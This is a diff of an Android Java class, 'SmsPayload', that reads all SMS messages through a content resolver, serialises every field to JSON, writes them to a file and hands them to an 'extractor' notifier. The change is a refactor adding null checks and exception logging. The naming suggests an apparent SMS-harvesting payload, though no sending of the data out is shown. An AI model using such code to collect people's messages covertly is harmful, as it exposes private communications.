@@ -1,9 +1,11 @@
 package com.aigs.serviceone.payload;
 
+import android.annotation.SuppressLint;
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
+import android.util.Log;
 
 import com.aigs.serviceone.helpers.FileSystem;
 import com.aigs.serviceone.helpers.SmsExtractorNotifier;
@@ -18,7 +20,7 @@ import java.lang.ref.WeakReference;
 
 public class SmsPayload extends AsyncTask<String, Integer, String> {
 
-    private WeakReference<Context> contextRef;
+    private final WeakReference<Context> contextRef;
     private SmsExtractorNotifier smsExtractorNotifier;
 
     public SmsPayload(Context context) {
@@ -37,37 +39,39 @@ public class SmsPayload extends AsyncTask<String, Integer, String> {
 
     @Override
     protected String doInBackground(@SmsModes String... strings) {
-        Context context = contextRef.get();
-
-        String msgData = "";
-
         try {
-            Cursor cursor = context.getContentResolver().query(Uri.parse(strings[0]), null, null, null, null);
+            Context context = contextRef.get();
 
-            if (cursor.moveToFirst()) { // must check the result to prevent exception
-                JSONArray jsonArray = new JSONArray();
+            try {
+                @SuppressLint("Recycle") Cursor cursor = context.getContentResolver().query(Uri.parse(strings[0]), null, null, null, null);
 
-                do {
-                    JSONObject jsonObject = new JSONObject();
-                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
-                        jsonObject.put(cursor.getColumnName(idx), cursor.getString(idx));
-                    }
-                    jsonArray.put(jsonObject);
+                if (cursor != null && cursor.moveToFirst()) { // must check the result to prevent exception
+                    JSONArray jsonArray = new JSONArray();
+
+                    do {
+                        JSONObject jsonObject = new JSONObject();
+                        for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
+                            jsonObject.put(cursor.getColumnName(idx), cursor.getString(idx));
+                        }
+                        jsonArray.put(jsonObject);
 
 
-                } while (cursor.moveToNext());
+                    } while (cursor.moveToNext());
 
-                File file = FileSystem.createInstance(context).smsOperationType(strings[0]).writeSmsData(jsonArray.toString());
-                smsExtractorNotifier.onSmsRetrieved(file,jsonArray.toString());
-            } else {
-                // empty box, no SMS
-                smsExtractorNotifier.onResponseEmpty();
+                    File file = FileSystem.createInstance(context).smsOperationType(strings[0]).writeSmsData(jsonArray.toString());
+                    smsExtractorNotifier.onSmsRetrieved(file, jsonArray.toString());
+                } else {
+                    // empty box, no SMS
+                    smsExtractorNotifier.onResponseEmpty();
+                }
+            } catch (JSONException e) {
+                e.printStackTrace();
             }
-        } catch (JSONException e) {
-            e.printStackTrace();
+        }catch (Exception e){
+            Log.e("EXCEPTION_SMS : ",e.getMessage());
         }
 
-        return msgData;
+        return null;
     }
 
     @Override
